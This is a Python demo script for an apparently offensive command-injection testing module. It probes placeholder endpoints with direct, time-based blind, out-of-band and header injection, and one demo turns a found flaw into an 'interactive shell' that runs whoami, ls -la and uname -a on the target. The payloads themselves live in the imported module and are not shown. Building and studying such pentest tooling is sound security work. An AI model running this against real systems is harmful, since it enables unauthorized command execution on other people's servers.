"""Demo script for Command Injection module

This script demonstrates the usage of the Command Injection module
for testing command injection vulnerabilities.
"""

import asyncio
from app.modules.command_injection import (
    CommandInjectionTester,
    InteractiveShell,
    InjectionPoint,
    CommandInjectionType,
)
from app.core.request_handler import RequestHandler
from app.core.oob_listener import OOBListener


async def demo_direct_injection():
    """Demo: Direct command injection with visible output"""
    print("\n" + "=" * 60)
    print("Demo: Direct Command Injection")
    print("=" * 60)
    
    # Initialize components
    request_handler = RequestHandler()
    tester = CommandInjectionTester(request_handler=request_handler)
    
    # Define injection point (example vulnerable endpoint)
    injection_point = InjectionPoint(
        parameter="filename",
        location="query",
        original_value="test.txt",
        url="http://vulnerable-app.local/view?filename=test.txt",
        method="GET"
    )
    
    print(f"\nTesting injection point:")
    print(f"  URL: {injection_point.url}")
    print(f"  Parameter: {injection_point.parameter}")
    print(f"  Location: {injection_point.location}")
    
    # Test for direct injection only
    print("\nTesting for direct command injection...")
    results = await tester.test_injection_point(
        injection_point,
        techniques=[CommandInjectionType.DIRECT]
    )
    
    for result in results:
        if result.is_vulnerable:
            print(f"\n✓ VULNERABLE!")
            print(f"  Type: {result.injection_type.value}")
            print(f"  Separator: {result.separator}")
            print(f"  Payload: {result.payload}")
            print(f"  Confidence: {result.confidence * 100:.1f}%")
            print(f"  Output detected: {result.output[:100]}...")
        else:
            print(f"\n✗ Not vulnerable to direct injection")


async def demo_time_based_blind():
    """Demo: Time-based blind command injection"""
    print("\n" + "=" * 60)
    print("Demo: Time-Based Blind Command Injection")
    print("=" * 60)
    
    # Initialize components
    request_handler = RequestHandler()
    tester = CommandInjectionTester(request_handler=request_handler)
    
    # Define injection point
    injection_point = InjectionPoint(
        parameter="backup_name",
        location="post",
        original_value="daily",
        url="http://vulnerable-app.local/backup",
        method="POST",
        data={"backup_name": "daily", "action": "restore"}
    )
    
    print(f"\nTesting injection point:")
    print(f"  URL: {injection_point.url}")
    print(f"  Parameter: {injection_point.parameter}")
    print(f"  Location: {injection_point.location}")
    print(f"  Method: {injection_point.method}")
    
    # Test for time-based blind injection
    print("\nTesting for time-based blind injection...")
    print("(This may take a while due to timing measurements)")
    
    results = await tester.test_injection_point(
        injection_point,
        techniques=[CommandInjectionType.BLIND_TIME]
    )
    
    for result in results:
        if result.is_vulnerable:
            print(f"\n✓ VULNERABLE!")
            print(f"  Type: {result.injection_type.value}")
            print(f"  Separator: {result.separator}")
            print(f"  Payload: {result.payload}")
            print(f"  Confidence: {result.confidence * 100:.1f}%")
            print(f"  Response time: {result.response_time:.2f}s")
            print(f"  Baseline: {result.metadata.get('baseline_avg', 0):.2f}s")
        else:
            print(f"\n✗ Not vulnerable to time-based blind injection")


async def demo_oob_blind():
    """Demo: OOB blind command injection"""
    print("\n" + "=" * 60)
    print("Demo: OOB Blind Command Injection")
    print("=" * 60)
    
    # Initialize components
    request_handler = RequestHandler()
    oob_listener = OOBListener(
        http_port=8080,
        dns_port=53,
        domain="oob.example.com"
    )
    
    # Start OOB listener
    print("\nStarting OOB listener...")
    await oob_listener.start()
    print(f"  HTTP listener: port {oob_listener.http_port}")
    print(f"  DNS listener: port {oob_listener.dns_port}")
    print(f"  Domain: {oob_listener.domain}")
    
    tester = CommandInjectionTester(
        request_handler=request_handler,
        oob_listener=oob_listener
    )
    
    # Define injection point
    injection_point = InjectionPoint(
        parameter="hostname",
        location="query",
        original_value="localhost",
        url="http://vulnerable-app.local/ping?hostname=localhost",
        method="GET"
    )
    
    print(f"\nTesting injection point:")
    print(f"  URL: {injection_point.url}")
    print(f"  Parameter: {injection_point.parameter}")
    print(f"  Location: {injection_point.location}")
    
    # Test for OOB blind injection
    print("\nTesting for OOB blind injection...")
    print("(Waiting for callbacks...)")
    
    results = await tester.test_injection_point(
        injection_point,
        techniques=[CommandInjectionType.BLIND_OOB]
    )
    
    for result in results:
        if result.is_vulnerable:
            print(f"\n✓ VULNERABLE!")
            print(f"  Type: {result.injection_type.value}")
            print(f"  Separator: {result.separator}")
            print(f"  Payload: {result.payload}")
            print(f"  Confidence: {result.confidence * 100:.1f}%")
            print(f"  OOB Callback ID: {result.oob_callback_id}")
            
            callback_info = result.metadata.get('callback', {})
            print(f"  Callback type: {callback_info.get('type')}")
            print(f"  Source IP: {callback_info.get('source_ip')}")
        else:
            print(f"\n✗ Not vulnerable to OOB blind injection")
    
    # Stop OOB listener
    await oob_listener.stop()


async def demo_interactive_shell():
    """Demo: Interactive shell after successful injection"""
    print("\n" + "=" * 60)
    print("Demo: Interactive Shell")
    print("=" * 60)
    
    # Initialize components
    request_handler = RequestHandler()
    tester = CommandInjectionTester(request_handler=request_handler)
    
    # Define injection point
    injection_point = InjectionPoint(
        parameter="file",
        location="query",
        original_value="data.txt",
        url="http://vulnerable-app.local/read?file=data.txt",
        method="GET"
    )
    
    print(f"\nTesting injection point:")
    print(f"  URL: {injection_point.url}")
    print(f"  Parameter: {injection_point.parameter}")
    
    # Test for vulnerabilities
    print("\nTesting for command injection...")
    results = await tester.test_injection_point(injection_point)
    
    # Find a successful result
    vulnerable_result = None
    for result in results:
        if result.is_vulnerable:
            vulnerable_result = result
            break
    
    if vulnerable_result:
        print(f"\n✓ Vulnerability found!")
        print(f"  Type: {vulnerable_result.injection_type.value}")
        print(f"  Separator: {vulnerable_result.separator}")
        
        # Create interactive shell
        print("\nCreating interactive shell...")
        shell = InteractiveShell(
            request_handler=request_handler,
            injection_point=injection_point,
            injection_result=vulnerable_result
        )
        
        # Execute commands
        commands = ["whoami", "pwd", "ls -la", "uname -a"]
        
        print("\nExecuting commands:")
        for cmd in commands:
            print(f"\n$ {cmd}")
            try:
                output = await shell.execute_command(cmd)
                print(output[:200])  # Print first 200 chars
                if len(output) > 200:
                    print("...")
            except Exception as e:
                print(f"Error: {e}")
        
        # Show history
        print("\n" + "-" * 60)
        print("Command History:")
        print("-" * 60)
        history = shell.get_history()
        for i, (cmd, output) in enumerate(history, 1):
            print(f"{i}. {cmd}")
            print(f"   Output: {output[:50]}...")
    else:
        print(f"\n✗ No vulnerabilities found")


async def demo_all_techniques():
    """Demo: Test all techniques on a single injection point"""
    print("\n" + "=" * 60)
    print("Demo: All Techniques")
    print("=" * 60)
    
    # Initialize components
    request_handler = RequestHandler()
    oob_listener = OOBListener()
    await oob_listener.start()
    
    tester = CommandInjectionTester(
        request_handler=request_handler,
        oob_listener=oob_listener
    )
    
    # Define injection point
    injection_point = InjectionPoint(
        parameter="cmd",
        location="query",
        original_value="status",
        url="http://vulnerable-app.local/exec?cmd=status",
        method="GET"
    )
    
    print(f"\nTesting injection point:")
    print(f"  URL: {injection_point.url}")
    print(f"  Parameter: {injection_point.parameter}")
    
    # Test all techniques
    print("\nTesting all techniques...")
    results = await tester.test_injection_point(injection_point)
    
    print(f"\nResults: {len(results)} technique(s) tested")
    
    for i, result in enumerate(results, 1):
        print(f"\n{i}. {result.injection_type.value if result.injection_type else 'Unknown'}")
        if result.is_vulnerable:
            print(f"   ✓ VULNERABLE")
            print(f"   Separator: {result.separator}")
            print(f"   Confidence: {result.confidence * 100:.1f}%")
            print(f"   Payload: {result.payload[:80]}...")
        else:
            print(f"   ✗ Not vulnerable")
    
    await oob_listener.stop()


async def demo_header_injection():
    """Demo: Command injection in HTTP headers"""
    print("\n" + "=" * 60)
    print("Demo: Header Injection")
    print("=" * 60)
    
    # Initialize components
    request_handler = RequestHandler()
    tester = CommandInjectionTester(request_handler=request_handler)
    
    # Define injection point in User-Agent header
    injection_point = InjectionPoint(
        parameter="User-Agent",
        location="header",
        original_value="Mozilla/5.0",
        url="http://vulnerable-app.local/",
        method="GET",
        headers={"User-Agent": "Mozilla/5.0"}
    )
    
    print(f"\nTesting injection point:")
    print(f"  URL: {injection_point.url}")
    print(f"  Parameter: {injection_point.parameter}")
    print(f"  Location: {injection_point.location}")
    
    # Test for injection
    print("\nTesting for command injection in headers...")
    results = await tester.test_injection_point(injection_point)
    
    for result in results:
        if result.is_vulnerable:
            print(f"\n✓ VULNERABLE!")
            print(f"  Type: {result.injection_type.value}")
            print(f"  Separator: {result.separator}")
            print(f"  Confidence: {result.confidence * 100:.1f}%")
        else:
            print(f"\n✗ Not vulnerable")


async def main():
    """Run all demos"""
    print("\n" + "=" * 60)
    print("Command Injection Module - Demo Suite")
    print("=" * 60)
    print("\nThis demo showcases the Command Injection module capabilities.")
    print("Note: These demos require vulnerable test applications to work.")
    
    demos = [
        ("Direct Injection", demo_direct_injection),
        ("Time-Based Blind", demo_time_based_blind),
        ("OOB Blind", demo_oob_blind),
        ("Interactive Shell", demo_interactive_shell),
        ("All Techniques", demo_all_techniques),
        ("Header Injection", demo_header_injection),
    ]
    
    print("\nAvailable demos:")
    for i, (name, _) in enumerate(demos, 1):
        print(f"  {i}. {name}")
    print(f"  {len(demos) + 1}. Run all demos")
    
    # For demo purposes, we'll just show the structure
    # In a real scenario, you would prompt for user input
    print("\nTo run a specific demo, call the corresponding function:")
    print("  await demo_direct_injection()")
    print("  await demo_time_based_blind()")
    print("  await demo_oob_blind()")
    print("  await demo_interactive_shell()")
    print("  await demo_all_techniques()")
    print("  await demo_header_injection()")


if __name__ == "__main__":
    asyncio.run(main())
